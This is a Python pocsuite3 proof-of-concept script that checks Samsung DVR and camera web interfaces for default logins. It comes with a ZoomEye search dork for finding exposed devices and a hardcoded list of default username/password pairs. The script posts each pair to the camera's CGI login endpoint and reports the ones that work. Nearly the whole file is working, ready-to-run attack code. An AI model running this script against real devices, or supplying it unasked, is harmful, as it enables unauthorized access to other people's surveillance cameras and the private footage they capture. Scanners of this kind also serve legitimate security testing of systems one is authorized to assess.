#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# from pocsuite3.api import (
#     minimum_version_required, POCBase, register_poc, requests, logger,
#     OptString, OrderedDict,
#     random_str,
# )
# import base64
# import os
# import random
# import re
# from urllib.parse import urljoin, urlparse
import hashlib
from urllib.parse import urljoin, quote
import re
import requests
from requests.auth import HTTPDigestAuth
from pocsuite3.api import logger
from pocsuite3.api import register_poc,POCBase
from urllib.parse import urljoin, urlparse
import os.path
import base64
import random
#minimum_version_required('1.9.11')


class DemoPOC(POCBase):
    name = 'Samsung Camera 默认密码'
    appName = "Samsung"
    vulDate='2023-04-12'
    dork = {
        "zoomeye":'app:"Samsung DVR httpd""'
    }





    # 打印结果
    def _verify(self):

        proxy = '127.0.0.1:8080'
        proxies = {
            'http': 'http://' + proxy,
            'https': 'https://' + proxy,
        }
        usernames = ['admin', 'root']
        passwords = ['4321', 'admin']
        # admin 4321
        # root 4321
        # root admin

        Host = (re.search('([\w-]+\.)+\w{1,3}', self.url)).group(0)
        for username in usernames:
            for password in passwords:
                if username == 'admin' and password == 'admin':
                    continue
                session = requests.session()
                hash_md5 = hashlib.md5()
                hash_md5.update(password.encode('utf-8'))
                #hash_md5.update(password)
                digest = hash_md5.hexdigest()

                encoded_id = base64.b64encode(username.encode('utf-8')).decode('utf-8')
                encoded_pwd = base64.b64encode(password.encode('utf-8')).decode('utf-8')
                session_id = random.random()
                # 将所有参数拼接成 Cookie 字符串
                datas = {
                    'close_user_session': 0,
                    'lang': 'cn',
                    'port': 0,
                    'id': username,
                    'pwd': username,
                }
                cookie = {
                    'ID': f'{encoded_id}&PWD={encoded_pwd}&SessionID={session_id}'
                }
                header = {
                    'Host': Host,
                    'Referer': self.url + '/cgi-bin/webviewer_login_page?lang=cn&loginvalue=0&port=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
                    'Origin': self.url,
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
                }
                url = urljoin(self.url, '/cgi-bin/webviewer_cgi_login')
                res = session.post(url, cookies=cookie, data=datas, headers=header,verify=False, proxies=proxies)

                if res.status_code == 200 and '../index.htm?port=0' in res.text:
                    result = {'VerifyInfo':{'usernmae':username,'password':password}}
                    result['VerifyInfo'].update({"URL": self.url})
                    return self.parse_output(result)
        # result['VerifyInfo'] = {}
        # result['VerifyInfo']['URL'] = self.url
        # result['VerifyInfo'][param] = ''
        # return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)

if __name__ == '__main__':
    exp = DemoPOC()
    exp.set_option("url",'http://127.0.0.1/')
    exp.execute(mode='verify')